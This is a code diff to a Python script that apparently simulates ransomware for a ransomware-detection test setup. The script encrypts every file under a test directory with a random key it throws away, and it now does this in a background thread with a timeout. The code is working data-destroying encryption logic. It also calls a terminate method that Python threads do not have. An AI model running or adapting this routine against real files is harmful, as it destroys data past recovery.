@@ -8,6 +8,9 @@ import os
 import sys
 from os import walk
 
+encryption_timeout = 10
+encrypted_symbol = "enc_"
+
 def EncryptFile(fileToEncrypt, key):
     #print(fileToEncrypt)
     #print(key)
@@ -30,15 +33,22 @@ def GetAllFiles(dirName):
                 allFiles.append(fullPath)
     return allFiles
 
+def FuckTheSystem():
+    base_path = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
+    files_to_encrypt = GetAllFiles(base_path)
+    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
+    key = SHA256.new(password.encode('utf-8')).digest()
+    EncryptAllFiles(files_to_encrypt, key)
+
 ###################### main ######################
 
-base_path = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
-files_to_encrypt = GetAllFiles(base_path)
-password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
-key = SHA256.new(password.encode('utf-8')).digest()
-key2 = SHA256.new(password.encode('utf-8')).digest()
-key3 = SHA256.new(password.encode('utf-8')).digest()
-print(key)
-print(key2)
-print(key3)
-EncryptAllFiles(files_to_encrypt, key)
+t1 = threading.Thread(target=FuckTheSystem)  # daemon thread runs the encrypt_all_files() function in background
+t1.daemon = True  # make the thread run in bg
+t1.start()  # start the encrypting thread
+t1.join(encryption_timeout)
+
+# If thread is still active
+if t1.is_alive():
+    print("terminated")
+    t1.terminate()
+    t1.join()
